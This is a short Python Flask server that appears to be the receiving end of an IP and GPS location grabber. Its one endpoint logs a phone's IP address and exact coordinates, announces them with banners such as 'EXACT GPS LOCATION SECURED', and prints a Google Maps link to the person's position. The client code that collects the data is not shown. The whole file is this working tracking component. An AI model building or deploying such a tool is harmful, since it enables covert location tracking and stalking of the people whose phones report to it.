from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route("/log-ip", methods=["POST"])
def log_ip():
  data = request.get_json()
  
  phone_ip = data.get("ip", "Unknown")
  lat = data.get("latitude")
  lon = data.get("longitude")
  accuracy = data.get("accuracy")

  print("\n" + "=" * 55)
  print(f"[+] RECEIVED CONNECTION FROM IP: {phone_ip}")
  
  if lat and lon:
      print("\n[+] EXACT GPS LOCATION SECURED:")
      print(f"[-] Latitude:  {lat}")
      print(f"[-] Longitude: {lon}")
      print(f"[-] Accuracy:  Within {accuracy} meters")
      print(f"[-] Open in Google Maps: https://www.google.com/maps?q={lat},{lon}")
  else:
      print("[-] No exact GPS data provided (Permission likely denied).")

  print("=" * 55 + "\n")
  return jsonify({"status": "success", "message": "Data logged!"}), 200

if __name__ == "__main__":
  app.run(host="0.0.0.0", port=5000)